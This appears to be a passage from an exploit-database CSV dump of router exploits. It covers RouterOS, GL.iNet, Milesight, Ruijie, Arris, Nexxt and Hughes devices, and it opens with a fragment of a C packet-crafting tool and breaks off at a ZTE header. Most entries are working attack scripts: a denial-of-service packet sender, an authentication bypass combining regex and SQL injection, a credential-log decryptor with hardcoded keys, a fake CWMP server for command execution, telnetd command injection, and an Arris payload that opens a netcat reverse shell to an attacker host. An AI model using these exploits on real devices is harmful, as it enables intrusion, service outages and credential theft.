if ( (macdest = libnet_hex_aton(macdst,&len)) == NULL) {
fprintf(stderr,""cant get mac str - %s"",libnet_geterror(p));
exit (1);
if ( (p = libnet_init (LIBNET_LINK, NULL, errbuff)) == NULL) {
fprintf(stderr,""cant init() - %s\n"",errbuff);
exit (1);
if ( (udp = libnet_build_udp(srcport,dstport,LIBNET_UDP_H + payloadlen,0,payload,payloadlen,p,udp)) == -1) {
fprintf(stderr,""cant build udp - %s\n"",libnet_geterror(p));
exit (1);
for (x=0;x<20;x++) {
ipopt[x] = libnet_get_prand(LIBNET_PR2);
ipoptions = libnet_build_ipv4_options (ipopt,20,p,ipoptions);
if ( (ip = libnet_build_ipv4 (LIBNET_IPV4_H + 20 + payloadlen + LIBNET_UDP_H,0,250,0,128,IPPROTO_UDP,
0,srcip,dstip,payload,payloadlen,p,ip)) == -1) {
fprintf(stderr,""cant build ipv4 - %s\n"",libnet_geterror(p));
exit (1);
if ((ether = libnet_build_ethernet (macdest,macdest,ETHERTYPE_IP,NULL,0,p,ether)) == -1) {
fprintf(stderr,""cant build ether - %s"",libnet_geterror(p));
exit (1);
if ( (ret = libnet_write(p)) == -1) {
fprintf(stderr,""%s\n"",libnet_geterror(p));
free(macdest); /* hex_aton malloc's - see libnet doco */
libnet_destroy(p);
return 0;"
2024-03-28,DoS,Hardware,ice-wzl,RouterOS 6.40.5,6.44 and 6.48.1 - 6.49.10 - Denial of Service,"# Exploit Title: CVE-2024-27686: RouterOS-SMB-DOS
# Google Dork: N/A
# Date: 03/04/2024
# Exploit Author: ice-wzl, Solstice Cyber Solutions
# Vendor Homepage: https://mikrotik.com/
# Software Link: https://mikrotik.com/download/archive
# Version: RouterOS devices ranging from 6.40.5 - 6.44 and 6.48.1 - 6.49.10
# Tested on: RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10
# CVE : CVE-2024-27686
#!/usr/bin/python3
# Founded by ice-wzl in conjunction with Solstice Cyber Solutions
# Define the packets
# the packet that causes crash 6.40.5 - 6.42.3","import argparse
import sys
import socket
fuzzed_packet_6 = b'\x00\x00\x00n\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x03\x00\xf1\x1f\x08\x00\x00\x00\x00\x00\x00\xe1\xbe\x82\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00G\xe5\x07\xf5\x07\xec\x01u\xe4Q]\x9e\xea\xedn\xa9\t\x00\x00\x00H\x00&\x00\\\x00\\\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005\x00.\x007\x007\x00\\\x00p\x00u\x00b\x00'
packet_0 = b'\x00\x00\x00\xea\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00\xe8\xe4*\x99\xc9\xeb\xb6E\xa2A\xe9(\xee%\xe5\xdfp\x00\x00\x00\x04\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00_\xf7m\xf2h*\x8f\x8ae\x0f8+T=Na8_\x0b@C\x82\xe7\x87\xc3qZ\xd7\xcf0M\x87\x00\x00\x02\x00\n\x00\x00\x00\x00\x00\x04\x00\x02\x00\x01\x00\x04\x00\x03\x00\x00\x00\x00\x00\x00\x00\x08\x00\x08\x00\x00\x00\x00\x00\x03\x00\x02\x00\x01\x00\x00\x00\x05\x00\x1a\x00\x00\x00\x00\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005\x00.\x008\x004\x00'
packet_2_fuzzed = b'\x00\x00\x00\xa2\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00X\x00J\x00\x00\x00\x00\x00\x00\x00\x00\x00`H\x05\x06+\x06\x01\x05\x05\x02\xa0>0<\xa0\x0e21540373\xed\xba\xad211\x0c\x06\n+\x06\x01\x04\x01\x82294517887446830\x02\x02\n\xa2*\x04(NTLMSSP\x00\x01\x00\x00\x00\x15\x82\x08b\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x06\x01\x00\x00\x00\x00\x00\x0f'
def open_connection(ip, port):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
s.connect((ip, port))
return s
except ConnectionRefusedError:
print(f""[!] Connection Refused on: {ip} {port}"")
sys.exit(2)
def send_payload_high(s):
s.send(packet_0)
s.send(packet_2_fuzzed)
s.close()
def send_payload_low(s):
s.send(fuzzed_packet_6)
s.close()
def verify_input(user_inp):
try:
user_inp = int(user_inp)
if user_inp > 2 or user_inp < 1:
return 3
else:
return user_inp
except ValueError:
return 0
if __name__ == '__main__':
parser = argparse.ArgumentParser(prog='SMB Crash',
description='Crashes Mikrotik RouterOS SMB Service 6.40.5 - 6.49.10',
epilog='Discovered by: ice-wzl')
parser.add_argument(""-t"", ""--target"", action=""store"", dest=""target"")
parser.add_argument(""-p"", ""--port"", action=""store"", dest=""port"")
args = parser.parse_args()
if not args.target or not args.port:
print(f""[+] python3 {sys.argv[0]} --help"")
sys.exit(1)
print(""[+] What version is the target:\n\t[1] 6.40.5 - 6.44\n\t[2] 6.48.1 - 6.49.10\nEnter 1 or 2:"")
version_choice = input(""--> "")
if verify_input(version_choice) == 0:
print(""Please enter a number..."")
sys.exit(3)
elif verify_input(version_choice) == 3:
print(""Please enter a number between 1 and 2"")
sys.exit(4)
if verify_input(version_choice) == 1:
if args.port:
get_connect = open_connection(args.target, int(args.port))
send_payload_low(get_connect)
print(f""[+] Sent DOS to {args.target} on {args.port}"")
else:
get_connect = open_connection(args.target, 445)
send_payload_low(get_connect)
print(f""[+] Sent DOS to {args.target} on 445"")
if verify_input(version_choice) == 2:
if args.port:
get_connect = open_connection(args.target, int(args.port))
send_payload_high(get_connect)
print(f""[+] Sent DOS to {args.target} on {args.port}"")
else:
get_connect = open_connection(args.target, 445)
send_payload_high(get_connect)
print(f""[+] Sent DOS to {args.target} on 445"")"
2024-03-06,WebApps,Hardware,Daniele Linguaglossa,GLiNet,Router Authentication Bypass,"# Exploit Title: [CVE-2023-46453] GL.iNet - Authentication Bypass
# Date: 18/10/2023
# Exploit Author: Daniele 'dzonerzy' Linguaglossa
# Vendor Homepage: https://www.gl-inet.com/
# Vulnerable Devices:
#   GL.iNet GL-MT3000 (4.3.7)
#   GL.iNet GL-AR300M(4.3.7)
#   GL.iNet GL-B1300 (4.3.7)
#   GL.iNet GL-AX1800 (4.3.7)
#   GL.iNet GL-AR750S (4.3.7)
#   GL.iNet GL-MT2500 (4.3.7)
#   GL.iNet GL-AXT1800 (4.3.7)
#   GL.iNet GL-X3000 (4.3.7)
#   GL.iNet GL-SFT1200 (4.3.7)
#   And many more...
# Version: 4.3.7
# Firmware Release Date: 2023/09/13
# CVE: CVE-2023-46453","DZONERZY Security Research
GLiNet: Router Authentication Bypass
Contents
1. Overview
2. Detailed Description
3. Exploit
4. Timeline
1. Overview
CVE-2023-46453 is a remote authentication bypass vulnerability in the web
interface of GLiNet routers running firmware versions 4.x and up. The
vulnerability allows an attacker to bypass authentication and gain access
to the router's web interface.
2. Detailed Description
The vulnerability is caused by a lack of proper authentication checks in
/usr/sbin/gl-ngx-session file. The file is responsible for authenticating
users to the web interface. The authentication is in different stages.
Stage 1:
During the first stage the user send a request to the challenge rcp
endpoint. The endpoint returns a random nonce value used later in the
authentication process.
Stage 2:
During the second stage the user sends a request to the login rcp endpoint
with the username and the encrypted password. The encrypted password is
calculated by the following formula:
md5(username + crypt(password) + nonce)
The crypt function is the standard unix crypt function.
The vulnerability lies in the fact that the username is not sanitized
properly before being passed to the login_test function in the lua script.
local function login_test(username, hash)
if not username or username == """" then return false end
for l in io.lines(""/etc/shadow"") do
local pw = l:match('^' .. username .. ':([^:]+)')
if pw then
for nonce in pairs(nonces) do
if utils.md5(table.concat({username, pw, nonce}, "":"")) ==
hash then
nonces[nonce] = nil
nonce_cnt = nonce_cnt - 1
return true
end
end
return false
end
end
return false
end
This script check the username against the /etc/shadow file. If the username
is found in the file the script will extract the password hash and compare
it to the hash sent by the user. If the hashes match the user is
authenticated.
The issue is that the username is not sanitized properly before being
concatenated with the regex. This allows an attacker to inject a regex into
the username field and modify the final behavior of the regex.
for instance, the following username will match the userid of the root user:
root:[^:]+:[^:]+ will become root:[^:]+:[^:]+:([^:]+)
This will match the ""root:"" string and then any character until the next "":""
character. This will cause the script skip the password and return the
user id instead.
Since the user id of the root user is always 0, the script will always
return:
md5(""root:[^:]+:[^:]+"" + ""0"" + nonce)
Since this value is always the same, the attacker can simply send the known
hash value to the login rcp endpoint and gain access to the web interface.
Anyway this approach won't work as expected since later in the code inside
the
this check appear:
local aclgroup = db.get_acl_by_username(username)
local sid = utils.generate_id(32)
sessions[sid] = {
username = username,
aclgroup = aclgroup,
timeout = time_now() + session_timeout
The username which is now our custom regex will be passed to the
get_acl_by_username
function. This function will check the username against a database and
return the aclgroup associated with the username.
If the username is not found in the database the function will return nil,
thus causing attack to fail.
By checking the code we can see that the get_acl_by_username function is
actually appending our raw string to a query and then executing it.
This means that we can inject a sql query into the username field and
make it return a valid aclgroup.
M.get_acl_by_username = function(username)
if username == ""root"" then return ""root"" end
local db = sqlite3.open(DB)
local sql = string.format(""SELECT acl FROM account WHERE username =
'%s'"", username)
local aclgroup = """"
for a in db:rows(sql) do
aclgroup = a[1]
end
db:close()
return aclgroup
end
Using this payload we were able to craft a username which is both a valid
regex and a valid sql query:
roo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+
this will make the sql query become:
SELECT acl FROM account WHERE username = 'roo[^'union selecT
char(114,111,111,116)--]:[^:]+:[^:]+'
which will return the aclgroup of the root user (root).
3. Exploit
from urllib.parse import urlparse
import requests
import hashlib
import random
import sys
def exploit(url):
try:
requests.packages.urllib3.disable_warnings()
host = urlparse(url)
url = f""{host.scheme}://{host.netloc}/rpc""
print(f""[*] Target: {url}"")
print(""[*] Retrieving nonce..."")
nonce = requests.post(url, verify=False, json={
""jsonrpc"": ""2.0"",
""id"": random.randint(1000, 9999),
""method"": ""challenge"",
""params"": {""username"": ""root""}
}, timeout=5).json()
if ""result"" in nonce and ""nonce"" in nonce[""result""]:
print(f""[*] Got nonce: {nonce['result']['nonce']} !"")
else:
print(""[!] Nonce not found, exiting... :("")
sys.exit(1)
print(""[*] Retrieving authentication token for root..."")
md5_hash = hashlib.md5()
md5_hash.update(
f""roo[^'union selecT
char(114,111,111,116)--]:[^:]+:[^:]+:0:{nonce['result']['nonce']}"".encode())
password = md5_hash.hexdigest()
token = requests.post(url, verify=False, json={
""jsonrpc"": ""2.0"",
""id"": random.randint(1000, 9999),
""method"": ""login"",
""params"": {
""username"": f""roo[^'union selecT
char(114,111,111,116)--]:[^:]+:[^:]+"",
""hash"": password
}, timeout=5).json()
if ""result"" in token and ""sid"" in token[""result""]:
print(f""[*] Got token: {token['result']['sid']} !"")
else:
print(""[!] Token not found, exiting... :("")
sys.exit(1)
print(""[*] Checking if we are root..."")
check = requests.post(url, verify=False, json={
""jsonrpc"": ""2.0"",
""id"": random.randint(1000, 9999),
""method"": ""call"",
""params"": [token[""result""][""sid""], ""system"", ""get_status"", {}]
}, timeout=5).json()
if ""result"" in check and ""wifi"" in check[""result""]:
print(""[*] We are authenticated as root! :)"")
print(""[*] Below some info:"")
for wifi in check[""result""][""wifi""]:
print(f""[*] --------------------"")
print(f""[*] SSID: {wifi['ssid']}"")
print(f""[*] Password: {wifi['passwd']}"")
print(f""[*] Band: {wifi['band']}"")
print(f""[*] --------------------"")
else:
print(""[!] Something went wrong, exiting... :("")
sys.exit(1)
except requests.exceptions.Timeout:
print(""[!] Timeout error, exiting... :("")
sys.exit(1)
except KeyboardInterrupt:
print(f""[!] Something went wrong: {e}"")
if __name__ == ""__main__"":
print(""GL.iNet Auth Bypass\n"")
if len(sys.argv) < 2:
print(
f""Usage: python3 {sys.argv[1]} https://target.com"",
file=sys.stderr)
sys.exit(0)
else:
exploit(sys.argv[1])
4. Timeline
2023/09/13 - Vulnerability discovered
2023/09/14 - CVE-2023-46453 requested
2023/09/20 - Vendor contacted
2023/09/20 - Vendor replied
2023/09/30 - CVE-2023-46453 assigned
2023/11/08 - Vulnerability patched and fix released"
2024-02-05,Remote,Hardware,Bipin Jitiya,"Milesight Routers UR5X, UR32L, UR32, UR35, UR41",Credential Leakage Through Unprotected System Logs and Weak Password Encryption,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-","Title: Credential Leakage Through Unprotected System Logs and Weak Password Encryption
CVE: CVE-2023-43261
Script Author: Bipin Jitiya (@win3zz)
Vendor: Milesight IoT - https://www.milesight-iot.com/ (Formerly Xiamen Ursalink Technology Co., Ltd.)
Software/Hardware: UR5X, UR32L, UR32, UR35, UR41 and there might be other Industrial Cellular Router could also be vulnerable.
Script Tested on: Ubuntu 20.04.6 LTS with Python 3.8.10
Writeup: https://medium.com/@win3zz/inside-the-router-how-i-accessed-industrial-routers-and-reported-the-flaws-29c34213dfdf
import sys
import requests
import re
import warnings
from Crypto.Cipher import AES # pip install pycryptodome
from Crypto.Util.Padding import unpad
import base64
import time
warnings.filterwarnings(""ignore"")
KEY = b'1111111111111111'
IV = b'2222222222222222'
def decrypt_password(password):
try:
return unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(password)), AES.block_size).decode('utf-8')
except ValueError as e:
display_output('      [-] Error occurred during password decryption: ' + str(e), 'red')
def display_output(message, color):
colors = {'red': '\033[91m', 'green': '\033[92m', 'blue': '\033[94m', 'yellow': '\033[93m', 'cyan': '\033[96m', 'end': '\033[0m'}
print(f""{colors[color]}{message}{colors['end']}"")
time.sleep(0.5)
urls = []
if len(sys.argv) == 2:
urls.append(sys.argv[1])
if len(sys.argv) == 3 and sys.argv[1] == '-f':
with open(sys.argv[2], 'r') as file:
urls.extend(file.read().splitlines())
if len(urls) == 0:
display_output('Please provide a URL or a file with a list of URLs.', 'red')
display_output('Example: python3 ' + sys.argv[0] + ' https://example.com', 'blue')
display_output('Example: python3 ' + sys.argv[0] + ' -f urls.txt', 'blue')
sys.exit()
use_proxy = False
proxies = {'http': 'http://127.0.0.1:8080/'} if use_proxy else None
for url in urls:
display_output('[*] Initiating data retrieval for: ' + url + '/lang/log/httpd.log', 'blue')
response = requests.get(url + '/lang/log/httpd.log', proxies=proxies, verify=False)
if response.status_code == 200:
display_output('[+] Data retrieval successful for: ' + url + '/lang/log/httpd.log', 'green')
data = response.text
credentials = set(re.findall(r'""username"":""(.*?)"",""password"":""(.*?)""', data))
num_credentials = len(credentials)
display_output(f'[+] Found {num_credentials} unique credentials for: ' + url, 'green')
if num_credentials > 0:
display_output('[+] Login page: ' + url + '/login.html', 'green')
display_output('[*] Extracting and decrypting credentials for: ' + url, 'blue')
display_output('[+] Unique Credentials:', 'yellow')
for i, (username, password) in enumerate(credentials, start=1):
display_output(f'    Credential {i}:', 'cyan')
decrypted_password = decrypt_password(password.encode('utf-8'))
display_output(f'      - Username: {username}', 'green')
display_output(f'      - Password: {decrypted_password}', 'green')
else:
display_output('[-] No credentials found in the retrieved data for: ' + url, 'red')
else:
display_output('[-] Data retrieval failed. Please check the URL: ' + url, 'red')"
2023-10-09,Remote,Hardware,Riyan Firmansyah of Seclab,Ruijie Reyee Mesh Router,MITM Remote Code Execution (RCE),"# Exploit Title: Ruijie Reyee Wireless Router firmware version B11P204 - MITM Remote Code Execution (RCE)
# Date: April 15, 2023
# Exploit Author: Mochammad Riyan Firmansyah of SecLab Indonesia
# Vendor Homepage: https://ruijienetworks.com
# Software Link: https://www.ruijienetworks.com/support/documents/slide_EW1200G-PRO-Firmware-B11P204
# Version: ReyeeOS 1.204.1614; EW_3.0(1)B11P204, Release(10161400)
# Tested on: Ruijie RG-EW1200, Ruijie RG-EW1200G PRO
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# command payload
# change this to serve on a different port","Summary
The Ruijie Reyee Cloud Web Controller allows the user to use a diagnostic tool which includes a ping check to ensure connection to the intended network, but the ip address input form is not validated properly and allows the user to perform OS command injection.
In other side, Ruijie Reyee Cloud based Device will make polling request to Ruijie Reyee CWMP server to ask if there's any command from web controller need to be executed. After analyze the network capture that come from the device, the connection for pooling request to Ruijie Reyee CWMP server is unencrypted HTTP request.
Because of unencrypted HTTP request that come from Ruijie Reyee Cloud based Device, attacker could make fake server using Man-in-The-Middle (MiTM) attack and send arbitrary commands to execute on the cloud based device that make CWMP request to fake server.
Once the attacker have gained access, they can execute arbitrary commands on the system or application, potentially compromising sensitive data, installing malware, or taking control of the system.
This advisory has also been published at https://github.com/ruzfi/advisory/tree/main/ruijie-wireless-router-mitm-rce.
from html import escape, unescape
import http.server
import socketserver
import io
import time
import re
import argparse
import gzip
command = ""uname -a""
PORT = 8080
def cwmp_inform(soap):
cwmp_id = re.search(r""(?:<cwmp:ID.*?>)(.*?)(?:<\/cwmp:ID>)"", soap).group(1)
product_class = re.search(r""(?:<ProductClass.*?>)(.*?)(?:<\/ProductClass>)"", soap).group(1)
serial_number = re.search(r""(?:<SerialNumber.*?>)(.*?)(?:<\/SerialNumber>)"", soap).group(1)
result = {'cwmp_id': cwmp_id, 'product_class': product_class, 'serial_number': serial_number, 'parameters': {}}
parameters = re.findall(r""(?:<P>)(.*?)(?:<\/P>)"", soap)
for parameter in parameters:
parameter_name = re.search(r""(?:<N>)(.*?)(?:<\/N>)"", parameter).group(1)
parameter_value = re.search(r""(?:<V>)(.*?)(?:<\/V>)"", parameter).group(1)
result['parameters'][parameter_name] = parameter_value
return result
def cwmp_inform_response():
return """"""<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:cwmp=""urn:dslforum-org:cwmp-1-0"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""><SOAP-ENV:Header><cwmp:ID SOAP-ENV:mustUnderstand=""1"">16</cwmp:ID><cwmp:NoMoreRequests>1</cwmp:NoMoreRequests></SOAP-ENV:Header><SOAP-ENV:Body><cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>""""""
def command_payload(command):
current_time = time.time()
result = """"""<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:cwmp=""urn:dslforum-org:cwmp-1-0"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""><SOAP-ENV:Header><cwmp:ID SOAP-ENV:mustUnderstand=""1"">ID:intrnl.unset.id.X_RUIJIE_COM_CN_ExecuteCliCommand{cur_time}</cwmp:ID><cwmp:NoMoreRequests>1</cwmp:NoMoreRequests></SOAP-ENV:Header><SOAP-ENV:Body><cwmp:X_RUIJIE_COM_CN_ExecuteCliCommand><Mode>config</Mode><CommandList SOAP-ENC:arrayType=""xsd:string[1]""><Command>{command}</Command></CommandList></cwmp:X_RUIJIE_COM_CN_ExecuteCliCommand></SOAP-ENV:Body></SOAP-ENV:Envelope>"""""".format(cur_time=current_time, command=command)
return result
def command_response(soap):
cwmp_id = re.search(r""(?:<cwmp:ID.*?>)(.*?)(?:<\/cwmp:ID>)"", soap).group(1)
command = re.search(r""(?:<Command>)(.*?)(?:<\/Command>)"", soap).group(1)
response = re.search(r""(?:<Response>)((\n|.)*?)(?:<\/Response>)"", soap).group(1)
result = {'cwmp_id': cwmp_id, 'command': command, 'response': response}
return result
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
protocol_version = 'HTTP/1.1'
def do_GET(self):
self.send_response(204)
self.end_headers()
def do_POST(self):
print(""[*] Got hit by"", self.client_address)
f = io.BytesIO()
if 'service' in self.path:
stage, info = self.parse_stage()
if stage == ""cwmp_inform"":
self.send_response(200)
print(""[!] Got Device information"", self.client_address)
print(""[*] Product Class:"", info['product_class'])
print(""[*] Serial Number:"", info['serial_number'])
print(""[*] MAC Address:"", info['parameters']['mac'])
print(""[*] STUN Client IP:"", info['parameters']['stunclientip'])
payload = bytes(cwmp_inform_response(), 'utf-8')
f.write(payload)
self.send_header(""Content-Length"", str(f.tell()))
elif stage == ""command_request"":
self.send_response(200)
self.send_header(""Set-Cookie"", ""JSESSIONID=6563DF85A6C6828915385C5CDCF4B5F5; Path=/service; HttpOnly"")
print(""[*] Device interacting"", self.client_address)
print(info)
payload = bytes(command_payload(escape(""ping -c 4 127.0.0.1 && {}"".format(command))), 'utf-8')
f.write(payload)
self.send_header(""Content-Length"", str(f.tell()))
else:
print(""[*] Command response"", self.client_address)
print(unescape(info['response']))
self.send_response(204)
f.write(b"""")
else:
print(""[x] Received invalid request"", self.client_address)
self.send_response(204)
f.write(b"""")
f.seek(0)
self.send_header(""Connection"", ""keep-alive"")
self.send_header(""Content-type"", ""text/xml;charset=utf-8"")
self.end_headers()
if f:
self.copyfile(f, self.wfile)
f.close()
def parse_stage(self):
content_length = int(self.headers['Content-Length'])
post_data = gzip.decompress(self.rfile.read(content_length))
if ""cwmp:Inform"" in post_data.decode(""utf-8""):
return (""cwmp_inform"", cwmp_inform(post_data.decode(""utf-8"")))
elif ""cwmp:X_RUIJIE_COM_CN_ExecuteCliCommandResponse"" in post_data.decode(""utf-8""):
return (""command_response"", command_response(post_data.decode(""utf-8"")))
else:
return (""command_request"", ""Ping!"")
def log_message(self, format, *args):
return
if __name__ == '__main__':
parser = argparse.ArgumentParser()
parser.add_argument('--bind', '-b', default='', metavar='ADDRESS',
help='Specify alternate bind address '
'[default: all interfaces]')
parser.add_argument('port', action='store',
default=PORT, type=int,
nargs='?',
help='Specify alternate port [default: {}]'.format(PORT))
args = parser.parse_args()
Handler = CustomHTTPRequestHandler
with socketserver.TCPServer((args.bind, args.port), Handler) as httpd:
ip_addr = args.bind if args.bind != '' else '0.0.0.0'
print(""[!] serving fake CWMP server at {}:{}"".format(ip_addr, args.port))
try:
httpd.serve_forever()
except KeyboardInterrupt:
pass
httpd.server_close()
Output
ubuntu:~$ python3 exploit.py
[!] serving fake CWMP server at 0.0.0.0:8080
[*] Got hit by ('[redacted]', [redacted])
[!] Got Device information ('[redacted]', [redacted])
[*] Product Class: EW1200G-PRO
[*] Serial Number: [redacted]
[*] MAC Address: [redacted]
[*] STUN Client IP: [redacted]:[redacted]
[*] Got hit by ('[redacted]', [redacted])
[*] Device interacting ('[redacted]', [redacted])
Ping!
[*] Got hit by ('[redacted]', [redacted])
[*] Command response ('[redacted]', [redacted])
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.400 ms
64 bytes from 127.0.0.1: seq=1 ttl=64 time=0.320 ms
64 bytes from 127.0.0.1: seq=2 ttl=64 time=0.320 ms
64 bytes from 127.0.0.1: seq=3 ttl=64 time=0.300 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.300/0.335/0.400 ms
Linux Ruijie 3.10.108 #1 SMP Fri Apr 14 00:39:29 UTC 2023 mips GNU/Linux"
2023-04-06,Remote,Hardware,Yerodin Richards,Arris Router Firmware 9.1.103,Remote Code Execution (RCE) (Authenticated),"# Exploit Title: Arris Router Firmware 9.1.103 - Remote Code Execution (RCE) (Authenticated)
# Date: 17/11/2022
# Exploit Author: Yerodin Richards
# Vendor Homepage: https://www.commscope.com/
# Version: 9.1.103
# Tested on: TG2482A, TG2492, SBG10
# CVE : CVE-2022-45701","import requests
import base64
router_host = ""http://192.168.0.1""
username = ""admin""
password = ""password""
lhost = ""192.168.0.6""
lport = 80
def main():
print(""Authorizing..."")
cookie = get_cookie(gen_header(username, password))
if cookie == '':
print(""Failed to authorize"")
exit(-1)
print(""Generating Payload..."")
payload = gen_payload(lhost, lport)
print(""Sending Payload..."")
send_payload(payload, cookie)
print(""Done, check shell.."")
def gen_header(u, p):
return base64.b64encode(f""{u}:{p}"".encode(""ascii"")).decode(""ascii"")
def no_encode_params(params):
return  ""&"".join(""%s=%s"" % (k,v) for k,v in params.items())
def get_cookie(header):
url = router_host+""/login""
params = no_encode_params({""arg"":header, ""_n"":1})
resp=requests.get(url, params=params)
return resp.content.decode('UTF-8')
def set_oid(oid, cookie):
url = router_host+""/snmpSet""
params = no_encode_params({""oid"":oid, ""_n"":1})
cookies = {""credential"":cookie}
requests.get(url, params=params, cookies=cookies)
def gen_payload(h, p):
return f""$\(nc%20{h}%20{p}%20-e%20/bin/sh)""
def send_payload(payload, cookie):
set_oid(""1.3.6.1.4.1.4115.1.20.1.1.7.1.0=16;2;"", cookie)
set_oid(f""1.3.6.1.4.1.4115.1.20.1.1.7.2.0={payload};4;"", cookie)
set_oid(""1.3.6.1.4.1.4115.1.20.1.1.7.3.0=1;66;"", cookie)
set_oid(""1.3.6.1.4.1.4115.1.20.1.1.7.4.0=64;66;"", cookie)
set_oid(""1.3.6.1.4.1.4115.1.20.1.1.7.5.0=101;66;"", cookie)
set_oid(""1.3.6.1.4.1.4115.1.20.1.1.7.9.0=1;2;"", cookie)
if __name__ == '__main__':
main()"
2023-04-01,Remote,Hardware,Yerodin Richards,Nexxt Router Firmware 42.103.1.5095,Remote Code Execution (RCE) (Authenticated),"# Exploit Title: Nexxt Router Firmware 42.103.1.5095 - Remote Code Executio=
# Date: 19/10/2022
# Exploit Author: Yerodin Richards
# Vendor Homepage: https://www.nexxtsolutions.com/
# Version: 42.103.1.5095
# Tested on: ARN02304U8
# CVE : CVE-2022-44149","n (RCE) (Authenticated)
import requests
import base64
router_host =3D ""http://192.168.1.1""
username =3D ""admin""
password =3D ""admin""
def main():
send_payload(""&telnetd"")
print(""connect to router using: `telnet ""+router_host.split(""//"")[1]+ ""=
` using known credentials"")
pass
def gen_header(u, p):
return base64.b64encode(f""{u}:{p}"".encode(""ascii"")).decode(""ascii"")
def get_cookie(header):
url =3D router_host+""/login""
params =3D {""arg"":header, ""_n"":1}
resp=3Drequests.get(url, params=3Dparams)
=20
def send_payload(payload):
url =3D router_host+""/goform/sysTools""
headers =3D {""Authorization"": ""Basic {}"".format(gen_header(username, pa=
ssword))}
params =3D {""tool"":""0"", ""pingCount"":""4"", ""host"": payload, ""sumbit"": ""OK=
requests.post(url, headers=3Dheaders, data=3Dparams)
if __name__ =3D=3D '__main__':
main()"
2023-04-01,Remote,Hardware,LiquidWorm,Hughes Satellite Router HX200 v8.3.1.14, Remote File Inclusion,"Summary: The HX200 is a high-performance satellite router designed to
Desc: The router contains a cross-frame scripting via remote file inclusion
// Hughes Satellite Router RFI/XFS PoC Exploit
// by lqwrm 2022
//URL http://TARGET/fs/dynaform/speedtest.html
//Reload target
//window.location.reload()
//Add cross-frame file include (http only)
//console.log(""Calling DoTest()"");
//DoTest()
//Unload weapon
//document.getElementById(""URLList"").remove();","Exploit Title: Hughes Satellite Router HX200 v8.3.1.14 -  Remote File Inclusion
Vendor: Hughes Network Systems, LLC
Product web page: https://www.hughes.com
Affected version: HX200 v8.3.1.14
HX90 v6.11.0.5
HX50L v6.10.0.18
HN9460 v8.2.0.48
HN7000S v6.9.0.37
provide carrier-grade IP services using dynamically assigned high-bandwidth
satellite IP connectivity. The HX200 satellite router provides flexible
Quality of Service (QoS) features that can be tailored to the network
applications at each individual remote router, such as Adaptive Constant
Bit Rate (CBR) bandwidth assignment to deliver high-quality, low jitter
bandwidth for real-time traffic such as Voice over IP (VoIP) or videoconferencing.
With integrated IP features including RIPv1, RIPv2, BGP, DHCP, NAT/PAT,
and DNS Server/Relay functionality, together with a high-performance
satellite modem, the HX200 is a full-featured IP Router with an integrated
high-performance satellite router. The HX200 enables high- performance
IP connectivity for a variety of applications including cellular backhaul,
MPLS extension services, virtual leased line, mobile services and other
high-bandwidth solutions.
vulnerability that may potentially be exploited by malicious users to compromise
an affected system. This vulnerability may allow an unauthenticated malicious
user to misuse frames, include JS/HTML code and steal sensitive information
from legitimate users of the application.
Tested on: WindWeb/1.0
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2022-5743
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5743.php
23.12.2022
snippet:///XFSRFI
console.log(""Loading Broadband Satellite Browsing Test"");
AddURLtoList(""http://www.zeroscience.mk/pentest/XSS.svg"");
console.log(""Calling StartTest()"");
StartTest()"
2023-03-30,Remote,Hardware,George Tsimpidas,Router ZTE-H108NS,Authentication Bypass,"# Exploit Title: Router ZTE-H108NS - Authentication Bypass
# Date: 19-11-2022
# Exploit Author: George Tsimpidas
# Vendor: https://www.zte.com.cn/global/
# Firmware: H108NSV1.0.7u_ZRD_GR2_A68
# CVE: N/A
